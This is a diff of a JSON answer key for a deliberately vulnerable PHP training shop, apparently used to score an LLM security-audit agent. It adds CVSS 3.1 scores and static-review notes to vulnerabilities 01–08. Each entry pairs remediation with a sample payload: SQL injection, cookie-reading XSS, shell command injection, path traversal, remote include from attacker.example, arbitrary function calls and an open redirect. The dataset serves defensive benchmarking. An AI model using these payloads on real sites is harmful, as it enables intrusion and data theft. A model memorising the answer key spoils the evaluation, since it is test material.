@@ -1,15 +1,28 @@
 {
-  "schema_version": "1.0",
+  "schema_version": "1.1",
   "name": "拾光商城 Lab30 Shop 漏洞数据集",
   "project": "llm-vuln-audit-feat-lab30-shop",
-  "source": "answers/answers.json 官方 30 项标注 + 靶场源码 app/public/**/*.php 与 app/src/*.php 逐行核对",
+  "source": "feat/lab30-shop 的 answers/answers.json（CVSS 3.1）+ 源码行号、入口与数据流补充",
   "count": 30,
-  "severity_map": { "极高": "critical", "高": "high", "中": "medium", "低": "low" },
-  "agent_taxonomy": ["sqli", "xss_r", "command_injection"],
+  "agent_taxonomy": [
+    "sqli",
+    "xss_r",
+    "command_injection"
+  ],
   "scenario_summary": {
-    "sqli": ["01", "23", "28"],
-    "xss_r": ["02", "25"],
-    "command_injection": ["03", "24"],
+    "sqli": [
+      "01",
+      "23",
+      "28"
+    ],
+    "xss_r": [
+      "02",
+      "25"
+    ],
+    "command_injection": [
+      "03",
+      "24"
+    ],
     "note": "仅这三类可映射到审计 agent 的分场景 taxonomy；其余漏洞属于更广的漏洞类型，供全量评分使用。"
   },
   "field_notes": {
@@ -17,15 +30,17 @@
     "type": "漏洞类型：中文人类可读类型名",
     "class": "漏洞类别：机器可读的粗粒度类别（用于分组/统计）",
     "scenario": "映射到 agent 分场景 taxonomy 的类别（sqli/xss_r/command_injection），其余为 null",
-    "severity": "漏洞等级：英文，与审计 agent 的 Severity（low/medium/high/critical）对齐",
-    "severity_cn": "漏洞等级：中文（极高/高/中/低）",
+    "severity": "由 CVSS 3.1 Base Score 按标准区间派生的兼容文字等级；0.0 为 none，不能据此删除漏洞真值",
+    "severity_cn": "由 CVSS 基础分派生：无/低/中/高/极高，不沿用旧的主观危害评级",
     "entry_point": "漏洞路口：外部输入进入应用的入口（路由/方法/参数/文件/行号/是否需登录）",
     "exploitation_path": "利用路径：input（输入）→ propagation（传播）→ sink（危险操作）的完整数据流",
     "evidence": "审计 agent 的 evidence 格式（path:start-end），供评分脚本直接匹配 finding.evidence",
     "attack_input": "触发漏洞的示例 payload",
     "normal_input": "对照组正常输入",
     "expected_result": "攻击与对照的可观测差异",
-    "remediation": "修复建议"
+    "remediation": "修复建议",
+    "cvss": "上游 CVSS 3.1 基础分、基础及完整向量、22 项原始指标；时序与环境分及 assessed 标记仅作背景",
+    "assessment": "上游静态分析前提与边界；未执行 POC，不表示已复现"
   },
   "vulnerabilities": [
     {
@@ -38,7 +53,10 @@
       "severity": "high",
       "severity_cn": "高",
       "location": [
-        { "path": "app/public/catalog/index.php", "line": 4 }
+        {
+          "path": "app/public/catalog/index.php",
+          "line": 4
+        }
       ],
       "entry_point": {
         "route": "GET /catalog/index.php",
@@ -55,12 +73,76 @@
         "sink": "db()->query() 原始拼接执行（app/public/catalog/index.php:4）",
         "flow": "q → $term → WHERE name LIKE '%...%' → query() 执行任意 SQL"
       },
-      "evidence": ["app/public/catalog/index.php:4"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/catalog/index.php:4"
+      ],
+      "preconditions": [
+        "商品检索 HTTP 入口可达；无需登录。",
+        "使用发布包默认 PDO/MySQL 与 MariaDB 业务库权限。"
+      ],
       "attack_input": "?q=' OR '1'='1' -- ",
       "normal_input": "?q=手冲壶",
       "expected_result": "正常输入只返回匹配商品；注入输入返回全部商品（或可 UNION 提取用户表数据）",
-      "remediation": "使用 PDO 预处理语句（prepare/execute 绑定参数）"
+      "remediation": "使用 PDO 预处理语句（prepare/execute 绑定参数）",
+      "description": "商品检索将 q 直接拼接进 products 查询的 LIKE 条件，再调用 PDO::query；对页面输出做 HTML 编码没有约束 SQL 语法。",
+      "impact": "可改变单条查询的结构并读取正常功能不应返回的敏感业务数据；没有把数据库写入或删表当作已建立的影响。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.5,
+        "environmental_score": 7.5,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "字符串拼接仍然有 SQL 注入；关闭模拟预处理不等于把已拼接的输入变为绑定参数。但它会影响能否把 SELECT 任意扩展成堆叠写语句。",
+          "本版本 PDO::ATTR_EMULATE_PREPARES=false，PDO::query 会先调用驱动 preparer；PHP 8.4.27 普通 SELECT 走原生 mysql_stmt_prepare。没有仅凭默认多语句连接标志推定堆叠写入已可用。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide",
+          "https://www.php.net/manual/en/class.pdo-mysql.php#pdo-mysql.constants.attr-multi-statements",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo_mysql/mysql_driver.c",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo/pdo_dbh.c"
+        ]
+      }
     },
     {
       "id": "02",
@@ -72,7 +154,10 @@
       "severity": "medium",
       "severity_cn": "中",
       "location": [
-        { "path": "app/public/catalog/greeting.php", "line": 3 }
+        {
+          "path": "app/public/catalog/greeting.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /catalog/greeting.php",
@@ -89,12 +174,71 @@
         "sink": "echo 输出到 HTML（app/public/catalog/greeting.php:3）",
         "flow": "name → 拼接 '你好，'.$name → 页面输出执行浏览器脚本"
       },
-      "evidence": ["app/public/catalog/greeting.php:3"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/catalog/greeting.php:3"
+      ],
+      "preconditions": [
+        "受害者访问包含不可信输入的欢迎页面。"
+      ],
       "attack_input": "?name=<script>alert(document.cookie)</script>",
       "normal_input": "?name=小明",
       "expected_result": "正常输入仅显示问候语；注入输入在浏览器执行脚本（弹出 cookie）",
-      "remediation": "输出前用 htmlspecialchars()（即 h()）转义"
+      "remediation": "输出前用 htmlspecialchars()（即 h()）转义",
+      "description": "到店欢迎页把 name 原样写入 HTML 标题，未进行上下文编码。",
+      "impact": "受害者打开受控欢迎链接时，脚本可在商城同源浏览器上下文读取内容并代行有限页面操作。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 6.1,
+        "environmental_score": 6.1,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以普通会员受害者及同源影响为评分边界，不把管理员被利用后的其他编号漏洞链计入。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "03",
@@ -103,10 +247,13 @@
       "class": "command_injection",
       "scenario": "command_injection",
       "cwe": "CWE-78",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/ping.php", "line": 2 }
+        {
+          "path": "app/public/ops/ping.php",
+          "line": 2
+        }
       ],
       "entry_point": {
         "route": "GET /ops/ping.php",
@@ -123,12 +270,71 @@
         "sink": "shell_exec()（app/public/ops/ping.php:2）",
         "flow": "host → 拼接 ping 命令 → shell_exec() 以 shell 语义执行"
       },
-      "evidence": ["app/public/ops/ping.php:2"],
-      "preconditions": ["需要 operator 或 admin 角色登录"],
+      "evidence": [
+        "app/public/ops/ping.php:2"
+      ],
+      "preconditions": [
+        "具有运营员或管理员权限，可访问网络诊断。"
+      ],
       "attack_input": "?host=127.0.0.1; id",
       "normal_input": "?host=127.0.0.1",
       "expected_result": "正常输入返回 ping 输出；注入输入在 ping 后追加执行 id（命令注入 RCE）",
-      "remediation": "不拼接 shell，改用 escapeshellarg() 或白名单/免 shell 的实现"
+      "remediation": "不拼接 shell，改用 escapeshellarg() 或白名单/免 shell 的实现",
+      "description": "网络诊断把 host 拼接进 shell_exec 的 ping 命令，未固定参数边界。",
+      "impact": "后台用户可使输入进入系统命令解释器，获得 Web 进程权限下的代码执行能力。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "04",
@@ -137,10 +343,13 @@
       "class": "path_traversal",
       "scenario": null,
       "cwe": "CWE-22",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/support/download.php", "line": 3 }
+        {
+          "path": "app/public/support/download.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /support/download.php",
@@ -157,12 +366,71 @@
         "sink": "is_file() + file_get_contents()（app/public/support/download.php:3）",
         "flow": "file → docs/ + ../.. 穿越 → file_get_contents() 读取任意文件内容"
       },
-      "evidence": ["app/public/support/download.php:3"],
-      "preconditions": ["需要登录（require_user）"],
+      "evidence": [
+        "app/public/support/download.php:3"
+      ],
+      "preconditions": [
+        "普通会员登录；目标文件对 Web 进程可读。"
+      ],
       "attack_input": "?file=../../vault/internal.txt",
       "normal_input": "?file=shipping.txt",
       "expected_result": "正常输入返回配送说明；穿越输入返回 vault 内部标记文件内容",
-      "remediation": "realpath() 规范化并限制在 docs 目录内，或改用白名单文件名映射"
+      "remediation": "realpath() 规范化并限制在 docs 目录内，或改用白名单文件名映射",
+      "description": "文档下载将 file 拼接到运行数据 docs 目录，未规范化并限制最终路径。",
+      "impact": "会员可能越过文档目录，读取 Web 进程可读的受限文件，包括进程环境中的应用连接资料。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 6.5,
+        "environmental_score": 6.5,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "这是读取入口，不据此声称可以写文件、执行命令或造成持续停机。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "05",
@@ -171,10 +439,13 @@
       "class": "lfi",
       "scenario": null,
       "cwe": "CWE-98",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/content/page.php", "line": 3 }
+        {
+          "path": "app/public/content/page.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /content/page.php",
@@ -191,12 +462,71 @@
         "sink": "include（app/public/content/page.php:3）",
         "flow": "page → resources/views/ + ../../ 穿越 → include 执行/输出目标 PHP 文件"
       },
-      "evidence": ["app/public/content/page.php:3"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/content/page.php:3"
+      ],
+      "preconditions": [
+        "无需登录；目标必须为现有、可读且满足 .php 后缀的文件。"
+      ],
       "attack_input": "?page=../../vault/account",
       "normal_input": "?page=home",
       "expected_result": "正常输入渲染商城介绍；穿越输入包含并执行 vault/account.php 泄露内部标记",
-      "remediation": "白名单允许的页面名，禁止路径分隔符，禁止用户控制 include 路径"
+      "remediation": "白名单允许的页面名，禁止路径分隔符，禁止用户控制 include 路径",
+      "description": "内容页将 page 拼入本地 include 路径，并附加固定的 .php 后缀，未限制允许的模板。",
+      "impact": "可包含预期模板目录之外的现有 PHP 文件；本版本明确存在的私有账户标记文件会输出受限标记。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.3,
+        "environmental_score": 5.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "固定后缀、现有文件以及应用中可用代码决定实际影响；未单独建立可写 PHP 文件或可利用包含链，不直接赋予 RCE 分值。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "06",
@@ -205,10 +535,13 @@
       "class": "rfi",
       "scenario": null,
       "cwe": "CWE-98",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/template-preview.php", "line": 3 }
+        {
+          "path": "app/public/ops/template-preview.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /ops/template-preview.php",
@@ -225,12 +558,73 @@
         "sink": "include $template（app/public/ops/template-preview.php:3）",
         "flow": "template → http://attacker/evil.php → include 执行远程 PHP 代码"
       },
-      "evidence": ["app/public/ops/template-preview.php:3"],
-      "preconditions": ["需要 operator/admin 登录", "PHP 开启 allow_url_include"],
+      "evidence": [
+        "app/public/ops/template-preview.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限。",
+        "allow_url_include=On，Web 容器能够访问所指定的模板资源。"
+      ],
       "attack_input": "?template=http://attacker.example/evil.php",
       "normal_input": "?template=http://fixtures:8080/templates/season.php",
       "expected_result": "正常输入预览合作方模板；恶意输入包含并执行远程脚本（RCE）",
-      "remediation": "禁止 include 用户可控的完整路径/URL，仅允许白名单模板键"
+      "remediation": "禁止 include 用户可控的完整路径/URL，仅允许白名单模板键",
+      "description": "远程模板预览直接 include 用户提供的模板地址；发布配置启用了 allow_url_include。",
+      "impact": "不可信远程模板可在 Web 进程中作为 PHP 执行，破坏应用数据与运行资源。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。",
+          "远程模板资源可由攻击者安排，额外托管资源本身不自动使 AC 升为 H。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "07",
@@ -239,10 +633,13 @@
       "class": "code_execution",
       "scenario": null,
       "cwe": "CWE-94",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/formula.php", "line": 3 }
+        {
+          "path": "app/public/ops/formula.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /ops/formula.php",
@@ -259,12 +656,71 @@
         "sink": "可变函数调用 $func($arg)（app/public/ops/formula.php:3）",
         "flow": "func/arg → $func($arg) → 调用任意 PHP 函数（system/phpinfo 等）"
       },
-      "evidence": ["app/public/ops/formula.php:3"],
-      "preconditions": ["需要 operator/admin 登录"],
+      "evidence": [
+        "app/public/ops/formula.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；危险函数未在运行配置中禁用。"
+      ],
       "attack_input": "?func=system&arg=id",
       "normal_input": "?func=strtoupper&arg=spring-sale",
       "expected_result": "正常输入大写转换文本；恶意输入调用 system() 执行 id（RCE）",
-      "remediation": "使用函数白名单映射，禁止用户直接指定函数名"
+      "remediation": "使用函数白名单映射，禁止用户直接指定函数名",
+      "description": "公式工具把 func 当作 PHP 可调用函数名称，并把 arg 交给该函数，未限制可调用函数集合。",
+      "impact": "工具可从普通文本试算扩展为危险函数调用，达到 Web 进程权限内的代码执行。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "08",
@@ -273,10 +729,13 @@
       "class": "open_redirect",
       "scenario": null,
       "cwe": "CWE-601",
-      "severity": "medium",
-      "severity_cn": "中",
+      "severity": "none",
+      "severity_cn": "无",
       "location": [
-        { "path": "app/public/auth/continue.php", "line": 3 }
+        {
+          "path": "app/public/auth/continue.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /auth/continue.php",
@@ -293,12 +752,71 @@
         "sink": "header('Location: ...')（app/public/auth/continue.php:3）",
         "flow": "next → Location 头 → 浏览器跳转到任意外部站点"
       },
-      "evidence": ["app/public/auth/continue.php:3"],
-      "preconditions": ["需要登录（require_user）"],
+      "evidence": [
+        "app/public/auth/continue.php:3"
+      ],
+      "preconditions": [
+        "受害者已登录并打开受控继续访问链接。"
+      ],
       "attack_input": "?next=https://evil.example",
       "normal_input": "?next=/orders/index.php",
       "expected_result": "正常输入跳站内订单页；恶意输入跳转到钓鱼站点（可配合钓鱼攻击）",
-      "remediation": "仅允许站内相对路径，或对目标域名做白名单校验"
+      "remediation": "仅允许站内相对路径，或对目标域名做白名单校验",
+      "description": "继续访问页在受害者登录后直接把 next 用作 Location 响应头，没有限制可信目标。",
+      "impact": "可将受害者导航到非预期站点；当前独立代码路径没有证明凭据泄露、业务记录修改或服务中断。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 0.0,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
